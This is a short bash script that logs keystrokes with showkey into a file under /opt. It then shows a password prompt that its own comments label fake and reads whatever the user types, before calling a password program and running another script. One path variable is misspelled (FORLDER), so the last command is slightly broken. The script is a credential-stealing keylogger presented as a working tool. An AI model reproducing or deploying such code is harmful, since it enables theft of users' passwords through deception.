#!/bin/bash

FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &

# for fake
echo -n "currently password : "
read currentPassword
echo ""
# end-for fake

/usr/bin/password
kill %1
/opt/$FORLDER/function.sh
